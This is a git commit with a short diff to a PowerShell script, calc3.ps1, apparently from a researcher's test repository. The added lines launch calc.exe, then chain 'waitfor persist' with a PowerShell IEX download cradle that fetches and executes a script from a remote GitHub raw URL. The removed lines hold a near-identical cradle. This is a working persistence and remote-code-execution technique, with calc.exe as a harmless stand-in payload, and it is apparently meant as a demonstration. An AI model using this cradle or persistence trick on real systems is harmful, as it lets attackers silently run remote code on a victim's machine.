6b8baa1f44c72f9267133ae1a69da44d7f764c39
3gstudent <robertpetersen@outlook.com>
2017-06-06 20:06:30 -0700

    Update calc3.ps1

--- calc3.ps1
+++ calc3.ps1
@@ -1,4 +1,2 @@
-# start-process calc.exe
-1
-$example_code ="cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc3.ps1')"
-invoke-expression $example_code
+start-process calc.exe
+cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1')
